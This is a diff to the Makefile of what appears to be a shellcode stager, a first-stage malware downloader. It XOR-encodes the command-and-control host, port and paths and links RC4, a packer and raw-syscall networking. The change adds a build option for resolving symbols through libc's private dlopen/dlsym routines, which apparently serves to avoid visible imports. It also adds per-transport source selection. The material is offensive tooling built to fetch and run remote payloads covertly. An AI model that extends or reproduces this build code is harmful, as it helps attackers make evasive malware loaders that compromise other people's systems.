@@ -38,7 +38,32 @@ XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_V
 TRANSPORT ?= http
 TRANSPORT_SRC = transport_$(TRANSPORT).c
 
+# dynload symbol resolution strategy (see dynload.c). Both modes resolve only
+# from libc.so.6.
+#   public  = dlopen/dlsym/dlclose (glibc >= 2.34)
+#   libc_dl = __libc_dlopen_mode/__libc_dlsym/__libc_dlclose (glibc < 2.34)
+DYNLOAD_MODE ?= public
+ifeq ($(DYNLOAD_MODE), libc_dl)
+  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=1
+else
+  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=0
+endif
+
+# Dynamic symbol hash table preference (see dynload.c)
+#   auto = DT_HASH then DT_GNU_HASH (default)
+#   sysv = DT_HASH only
+#   gnu  = DT_GNU_HASH only
+HASH_STYLE ?= auto
+ifeq ($(HASH_STYLE), sysv)
+  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=1
+else ifeq ($(HASH_STYLE), gnu)
+  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=2
+else
+  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=0
+endif
+
 # Config options
+COMMON_CFLAGS += $(DYNLOAD_MODE_CFLAG) $(HASH_STYLE_CFLAG)
 COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
 COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
 COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
@@ -47,7 +72,21 @@ COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
 COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
 COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
-STAGE0_SRCS = downloader.c dynload.c $(TRANSPORT_SRC) net_utils.c utils_min.c packer.c rc4.c debug.c syscalls.c
+# Granular source selection: compile only what the selected transport needs.
+#   http/tcp/udp -> raw syscall sockets (net_utils.c)
+#   libcurl      -> runtime dynamic loader (dynload.c)
+# New transports can extend these lists or add their own dependencies.
+SOCKET_TRANSPORTS := http tcp udp
+DYNLOAD_TRANSPORTS := libcurl
+
+STAGE0_SRCS = downloader.c utils_min.c packer.c rc4.c debug.c syscalls.c
+ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
+  STAGE0_SRCS += net_utils.c
+endif
+ifneq ($(filter $(TRANSPORT),$(DYNLOAD_TRANSPORTS)),)
+  STAGE0_SRCS += dynload.c
+endif
+STAGE0_SRCS += $(TRANSPORT_SRC)
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
